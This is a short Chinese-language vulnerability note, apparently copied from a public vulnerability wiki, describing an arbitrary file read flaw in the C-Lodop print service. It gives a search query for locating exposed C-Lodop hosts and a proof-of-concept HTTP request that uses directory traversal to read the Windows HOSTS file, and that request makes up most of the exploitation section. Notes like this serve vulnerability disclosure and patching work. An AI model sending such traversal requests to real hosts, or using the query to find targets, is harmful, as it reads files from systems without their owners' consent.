---
title: "C-Lodop打印机任意文件读取漏洞"
date: 2026-10-18 09:14:03
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "C"
tags:
  - "C"
  - "任意文件读取"
  - "漏洞复现"
---
## 漏洞描述

C-Lodop打印机存在任意文件读取漏洞，通过构造特殊URL，可实现读取系统任意文件。

## 网络测绘

```
title="C-Lodop"
```

## 漏洞复现

poc：

```
GET /../../../../../../../../windows/System32/drivers/etc/HOSTS HTTP/1.1
Host: 127.0.0.1
....
```

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/C-Lodop%E6%89%93%E5%8D%B0%E6%9C%BA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
